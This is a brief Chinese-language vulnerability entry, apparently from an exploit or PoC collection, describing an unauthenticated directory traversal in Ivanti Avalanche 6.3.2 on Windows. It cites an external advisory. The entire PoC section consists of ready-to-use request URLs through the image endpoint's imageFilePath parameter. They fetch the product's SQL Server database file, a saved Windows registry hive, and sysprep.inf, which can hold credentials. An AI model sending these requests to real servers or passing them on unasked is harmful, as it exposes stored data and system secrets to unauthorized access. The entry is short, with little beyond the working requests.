# Ivanti Avalanche 目录遍历漏洞


Ivanti Avalanche是一种移动设备管理系统。Ivanti Avalanche中的一个漏洞允许未经身份验证的远程用户请求位于“ image”文件夹之外的文件。

影响版本：

Windows v6.3.2.3490 的 Avalanche Premise 6.3.2

PoC：


```
数据库读取：
https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf

其它：
https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/Windows/system32/config/system.sav
https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/sysprep/sysprep.inf

```

ref：

https://ssd-disclosure.com/ssd-advisory-ivanti-avalanche-directory-traversal/